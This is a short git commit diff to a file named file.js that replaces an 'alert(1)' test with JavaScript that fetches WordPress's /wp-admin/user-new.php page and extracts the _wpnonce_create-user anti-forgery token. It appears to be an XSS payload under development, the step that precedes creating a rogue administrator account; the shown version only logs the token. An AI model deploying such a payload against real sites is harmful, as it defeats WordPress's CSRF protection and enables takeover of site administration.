2ca379766776fa6a2fc4bf791eeb4e3bc4e81afb
rrrddd_t <121048677+rrrdddt@users.noreply.github.com>
2026-09-16 09:13:48 +0300

    Add functionality to fetch and log nonce value
    Fetch user creation page and extract nonce value.

--- file.js
+++ file.js
@@ -1,1 +1,5 @@
-alert(1);
+var html = await (await fetch('/wp-admin/user-new.php')).text();
+var doc = new DOMParser().parseFromString(html, 'text/html');
+var nonce = doc.querySelector('#_wpnonce_create-user').value;
+
+console.log(nonce);
